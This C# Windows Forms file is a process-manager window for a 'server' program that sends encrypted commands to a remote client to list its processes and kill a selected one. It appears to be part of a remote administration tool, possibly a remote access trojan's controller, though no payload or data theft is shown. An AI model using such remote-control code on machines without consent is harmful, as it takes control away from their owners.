using server.Classes;
using server.Others;
using System;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
namespace server.Forms
{
    public partial class frm_procmgr : Form
    {
        public frm_procmgr()
        {
            InitializeComponent();
            update = true;
        }
        public int id;
        public bool update;
        private void frm_procmgr_Load(object sender, EventArgs e)
        {

        }

        private void flatButton2_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(id, Encoding.ASCII.GetBytes("GetProcesses"), Common.Current_Key);
        }

        private void refrechToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(id, Encoding.ASCII.GetBytes("GetProcesses"), Common.Current_Key);
        }

        private async void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem Item = lbRunningProcesses.SelectedItems[0];
            Form1.MainServer.Send(id, Encoding.ASCII.GetBytes("killProc {" + Item.SubItems[1].Text + "}"), Common.Current_Key);
            await Task.Delay(50);
            Item.Remove();
            Form1.MainServer.Send(id, Encoding.ASCII.GetBytes("GetProcesses"), Common.Current_Key);
        }

        private void flatButton1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Refrech_Tick(object sender, EventArgs e)
        {
            Form1.MainServer.Send(id, Helper.Getbytes("FLMGR_SYSRES"), Common.Current_Key);
        }

        private void flatContextMenuStrip1_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {

        }

        private void ColoreChange_Tick(object sender, EventArgs e)
        {

        }
    }
}
